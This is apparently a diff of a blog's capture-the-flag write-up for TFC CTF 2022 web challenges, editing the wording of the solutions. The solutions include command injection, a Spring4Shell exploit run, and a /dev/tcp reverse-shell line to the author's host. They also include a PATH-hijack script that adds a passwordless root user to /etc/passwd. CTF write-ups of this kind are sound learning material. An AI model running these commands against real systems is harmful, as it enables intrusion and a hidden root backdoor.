@@ -5,7 +5,7 @@
 
 <link rel='canonical' href='https://g0tfl4g.github.io/p/tfc-ctf-2022/'>
 
-<link rel="stylesheet" href="/scss/style.min.dbf896e8cd60d6cd94ddb762ebfacc6b843c5e6adabbafc546590c0cfb42b484.css"><meta property='og:title' content='TFC CTF 2022'>
+<link rel="stylesheet" href="/scss/style.min.a95427a142fd04763e4d9eb36cb0accf4c149f4cc76995a5bea7ceec3d7451e3.css"><meta property='og:title' content='TFC CTF 2022'>
 <meta property='og:description' content='TFC CTF 2022 Write Up'>
 <meta property='og:url' content='https://g0tfl4g.github.io/p/tfc-ctf-2022/'>
 <meta property='og:site_name' content='g0tfl4g'>
@@ -283,7 +283,7 @@
     <section class="article-content">
     
     
-    <p>Participated in TFC CTF 2022 with my team CyberSpace. I only played Web and solved all web challenges (8/8).</p>
+    <p>Played TFC CTF 2022 with my team CyberSpace. I only played Web and solved all Web challenges (8/8).</p>
 <p><img src="/p/tfc-ctf-2022/img/cyberspace.png"
 	width="812"
 	height="285"
@@ -298,7 +298,7 @@
 </p>
 <h2 id="robots-and-music">ROBOTS AND MUSIC</h2>
 <p>Web | WarmUp</p>
-<p>From the <code>robots.txt</code>, we can get the hidden endpoint <code>/g00d_old_mus1c.php</code>.</p>
+<p>From the <code>robots.txt</code>, I can get the hidden endpoint <code>/g00d_old_mus1c.php</code>.</p>
 <p><img src="/p/tfc-ctf-2022/img/ram_flag.png"
 	width="724"
 	height="200"
@@ -313,7 +313,7 @@
 </p>
 <h2 id="pong">PONG</h2>
 <p>Web | WarmUp</p>
-<p>This challenge is about <code>Command Injection</code>.</p>
+<p>This challenge is about <code>OS Command Injection</code>.</p>
 <p><img src="/p/tfc-ctf-2022/img/pong_1.png"
 	width="753"
 	height="94"
@@ -326,7 +326,7 @@
 	
 >
 </p>
-<p>Using <code>|</code> (pipe), we can inject the command as shown below.</p>
+<p>Using <code>|</code>, I can inject the commands as shown below and get the flag.</p>
 <p><img src="/p/tfc-ctf-2022/img/pong_2.png"
 	width="570"
 	height="105"
@@ -351,7 +351,6 @@
 	
 >
 </p>
-<p>And we can get the flag</p>
 <p><img src="/p/tfc-ctf-2022/img/pong_flag.png"
 	width="604"
 	height="124"
@@ -366,8 +365,8 @@
 </p>
 <h2 id="are-you-the-admin">ARE YOU THE ADMIN?</h2>
 <p>Web | Easy</p>
-<p>For this challenge, they provided us the source code, <code>index.tsx, auth.ts and schema prisma</code>, but I didn&rsquo;t need them to solve this one.</p>
-<p>We just need to add the extra parameter, <code>isAdmin</code>, in the JSON body when creating the account.</p>
+<p>For this challenge, they provided the source files, <code>index.tsx, auth.ts and schema.prisma</code>, but I didn&rsquo;t need them actually.</p>
+<p>I just need to add the extra parameter, <code>isAdmin</code>, in the JSON body when creating the account.</p>
 <p><img src="/p/tfc-ctf-2022/img/ayta_4.png"
 	width="700"
 	height="138"
@@ -409,7 +408,7 @@
 </p>
 <h2 id="calendar">CALENDAR</h2>
 <p>Web | Medium</p>
-<p>From the website, we can find out that the application is using a vulnerable version of modern-event-calendar-lite wordpress plugin.</p>
+<p>From the website, I can find out that the application is using a vulnerable version of the modern-event-calendar-lite WordPress plugin.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -438,7 +437,7 @@
 	
 >
 </p>
-<p>The exploit code can be found from the Exploit-DB (<a class="link" href="https://www.exploit-db.com/exploits/50084"  target="_blank" rel="noopener"
+<p>The exploit script can be found here (<a class="link" href="https://www.exploit-db.com/exploits/50084"  target="_blank" rel="noopener"
     >Wordpress Plugin Modern Events Calendar 5.16.2 - Event export</a>)</p>
 <p><img src="/p/tfc-ctf-2022/img/calendar_2.png"
 	width="799"
@@ -454,7 +453,7 @@
 </p>
 <h2 id="diamonds">DIAMONDS</h2>
 <p>Web | Medium</p>
-<p>This challenge is about Ruby Regex Bypassing + SSTI.</p>
+<p>This challenge is about <code>Ruby Regex Bypassing + SSTI</code>.</p>
 <p><img src="/p/tfc-ctf-2022/img/diamonds_1.png"
 	width="678"
 	height="160"
@@ -467,7 +466,7 @@
 	
 >
 </p>
-<p>If we attempt to submit characters such as <code>Å</code> (%c5), we can get the debug page due to <code>Invalid Byte Sequence in UTF-8</code> error and also the part of the source code.</p>
+<p>If we submit characters such as <code>Å</code> (%c5), we can get the debug page and also the part of the source code due to <code>Invalid Byte Sequence in UTF-8</code>.</p>
 <p><img src="/p/tfc-ctf-2022/img/diamonds_3.png"
 	width="914"
 	height="686"
@@ -490,7 +489,7 @@
 </span></span><span class="line"><span class="cl">    <span class="vi">@input</span> <span class="o">=</span> <span class="no">ERB</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">params</span><span class="o">[</span><span class="ss">:input</span><span class="o">]</span><span class="p">)</span><span class="o">.</span><span class="n">result</span><span class="p">(</span><span class="nb">binding</span><span class="p">)</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>It seems like there is no issue but in Ruby the <code>^</code> and <code>$</code> match at the start and end of each line. Therefore if any line matches the regex, we can bypass it.</p>
+</div><p>It seems like there is no issue in the Regex but in Ruby the <code>^</code> and <code>$</code> match at the start and end of each line. Therefore if any line matches the regex, we can bypass it.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -554,7 +553,7 @@
 	
 >
 </p>
-<p>I tried to read the <code>flag.txt</code> but didn&rsquo;t work. As we already have LFI, we can try RCE via Log Poisoning.</p>
+<p>Tried to read the <code>flag.txt</code> but didn&rsquo;t work. As we already have LFI, we can try RCE via Log Poisoning.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -577,7 +576,7 @@
 </span></span><span class="line"><span class="cl">Upgrade-Insecure-Requests: 1
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Now we just need to check the log file via LFI and execute our commands.</p>
+</div><p>After poisoning the log file, we just need to check the log file via LFI and execute our commands.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -602,7 +601,7 @@
 </p>
 <h2 id="tubeinc">TUBEINC</h2>
 <p>Web | Hard</p>
-<p>We have to get 2 flags, user and root, to complete this challenge.</p>
+<p>I need to get 2 flags, user.flag and root.flag, to complete this challenge.</p>
 <p>From the website footer, we can get the following information.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -633,7 +632,7 @@
 </span></span><span class="line"><span class="cl">34.65.33.171 legacy.tube.com
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Again from the bottom of the page, we can get the important information.</p>
+</div><p>Again from the bottom of the page, I can get the important information.</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -654,7 +653,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="c">  --&gt;</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>The <code>/info</code> page tells us that the website is using a compromised &ldquo;Spring-Boot&rdquo; framework. Yeaahhhh we all can assume that this is about <code>Spring4Shell</code> vulnerability.</p>
+</div><p>The <code>/info</code> page tells us that the website is using a compromised &ldquo;Spring-Boot&rdquo; framework. I think this is about <code>Spring4Shell</code> vulnerability.</p>
 <p><img src="/p/tfc-ctf-2022/img/tube_1.png"
 	width="814"
 	height="127"
@@ -678,7 +677,7 @@
 </span></span><span class="line"><span class="cl">python3 spring4shell.py http://legacy.tube.com:52524
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Now we can get the user flag from the <code>/home/user.flag</code></p>
+</div><p>Run the script and we can get the user flag from the <code>/home/user.flag</code></p>
 <p><img src="/p/tfc-ctf-2022/img/tube_3.png"
 	width="810"
 	height="59"
@@ -723,7 +722,7 @@
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>bash -i &gt;<span class="p">&amp;</span> /dev/tcp/myip/port 0&gt;<span class="p">&amp;</span><span class="m">1</span>
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>Now run the exploit, send request with the url parameter, and get the reverse shell :)</p>
+</div><p>Send a request with the url parameter, and get the reverse shell :)</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
@@ -758,19 +757,21 @@
 </span></span><span class="line"><span class="cl">* * * * * root apt update &gt;&gt; /var/log/cron.log
 </span></span></code></pre></td></tr></table>
 </div>
-</div><p>The <code>PATH</code> includes the global writeable directory <code>/var/tmp</code>. That means we can create our own malicious <code>apt</code> file and put it in the <code>/var/tmp</code> direcotry to make the cronjob executes our <code>apt</code> file not the original <code>apt</code>.</p>
+</div><p>The <code>PATH</code> includes the global writeable directory <code>/var/tmp</code>. That means we can create our malicious <code>apt</code> file and put it in the <code>/var/tmp</code> direcotry to make the cronjob executes our <code>apt</code> file not the original <code>apt</code>.</p>
 <p>apt</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
+</span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">echo</span> <span class="s2">&#34;imgroot::0:0:root:/root:/bin/bash” &gt;&gt; /etc/passwd
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="c1"># This will add the new root user without password</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;imgroot::0:0:root:/root:/bin/bash” &gt;&gt; /etc/passwd
 </span></span></span></code></pre></td></tr></table>
 </div>
-</div><p>Now we just need to get the root flag!!!!</p>
+</div><p>We just need to get the root flag</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
